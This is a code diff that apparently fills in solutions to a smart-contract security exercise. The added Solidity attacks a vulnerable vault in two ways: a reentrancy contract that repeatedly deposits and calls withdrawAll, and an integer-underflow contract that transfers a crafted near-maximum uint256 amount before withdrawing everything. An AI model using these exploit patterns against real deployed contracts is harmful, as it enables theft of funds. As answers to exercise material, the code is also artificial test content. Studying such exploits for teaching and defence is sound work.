@@ -17,6 +17,15 @@ contract ReentrancyAttacker {
         // Write your own code.
         // You have 10 deposit balance.
         // Be careful that the target (vulnerable) contract has 10_020 ethereum total.
+
+        ISafeVault safeVault = ISafeVault(msg.sender);
+
+        if(address(this).balance > 5000) return ;
+        
+        safeVault.deposit{value: address(this).balance}();
+        safeVault.withdrawAll(address(this));
+        
+
     }
 }
 
@@ -27,5 +36,12 @@ contract IntegerOverUnderflowAttacker {
         // Write your own code.
         // You have 10 deposit balance.
         // Be careful that the target (vulnerable) contract has 10_020 ethereum total.
+
+        ISafeVault safeVault = ISafeVault(vault);
+
+        safeVault.transfer(address(69), type(uint256).max - 10010 + 1);
+        safeVault.withdrawAll(address(this));
+
+        return ;
     }
 }
